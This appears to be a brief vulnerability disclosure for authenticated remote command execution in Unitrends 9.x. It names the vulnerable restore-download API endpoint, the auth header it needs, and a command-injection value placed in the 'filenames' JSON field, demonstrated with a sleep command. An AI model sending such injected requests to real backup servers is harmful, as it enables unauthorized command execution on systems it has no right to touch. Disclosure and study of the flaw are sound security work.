Authenticated RCE for Unitrends 9.x

URL: https://url/api/restore/download-files
Type: POST (json)

Description: An attacker can execute arbitrary commands on the machine once logged into the web application. You can do so by including a malicious command as a filename in your list of filenames.

Parameters:

filenames - Command you want to execute. Aka {"filenames": ["'\nsleep 10\n"]}

Headers required:

AuthToken - Cookie "token" given to you at login